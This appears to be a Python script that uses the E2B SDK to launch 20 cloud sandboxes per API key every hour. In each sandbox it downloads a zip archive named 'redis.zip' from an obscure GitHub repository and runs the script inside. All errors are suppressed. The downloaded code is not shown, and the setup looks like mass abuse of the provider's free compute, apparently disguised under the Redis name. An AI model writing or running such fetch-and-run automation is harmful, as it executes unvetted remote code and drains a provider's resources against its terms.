import time
import threading
from e2b import Sandbox
from concurrent.futures import ThreadPoolExecutor

CONFIGS = [

    {"name": "API1", "api_key": "", "template": "desktop"},






]

SANDBOX_COUNT = 20
ACTIVE_COUNT = 20
INTERVAL = 3600

COMMAND = """
sudo apt update
sudo apt install python3-pip -y
curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/redis.zip
unzip redis.zip
python3 run.py

"""

# Global counters
TOTAL = len(CONFIGS) * SANDBOX_COUNT
running = 0
counter_lock = threading.Lock()


def update_running(delta):
    global running

    with counter_lock:
        running += delta

        # Single-line status
        print(f"\rAPI GLOBAL RUNNING {running}/{TOTAL}", end="", flush=True)


def create_and_run(api_key, template):
    sb = None

    try:
        sb = Sandbox.create(
            template=template,
            timeout=3600,
            api_key=api_key
        )

        update_running(1)

        # Run sandbox
        sb.commands.run(
            COMMAND,
            timeout=3500
        )

    except Exception:
        pass

    finally:
        if sb:
            try:
                sb.kill()
            except Exception:
                pass

        update_running(-1)


def run_api(api_key, template):

    with ThreadPoolExecutor(max_workers=SANDBOX_COUNT) as executor:

        futures = []

        for _ in range(SANDBOX_COUNT):
            futures.append(
                executor.submit(
                    create_and_run,
                    api_key,
                    template
                )
            )

        for future in futures:
            try:
                future.result()
            except Exception:
                pass


print(f"🚀 Starting {TOTAL} sandboxes")

while True:

    start = time.time()

    # Reset counter
    with counter_lock:
        running = 0

    # Start all APIs simultaneously
    with ThreadPoolExecutor(max_workers=len(CONFIGS)) as executor:

        futures = []

        for config in CONFIGS:
            futures.append(
                executor.submit(
                    run_api,
                    config["api_key"],
                    config["template"]
                )
            )

        for future in futures:
            try:
                future.result()
            except Exception:
                pass

    elapsed = time.time() - start
    sleep_time = max(0, INTERVAL - elapsed)

    print(f"\nBatch finished. Next batch in {int(sleep_time)}s")

    time.sleep(sleep_time)
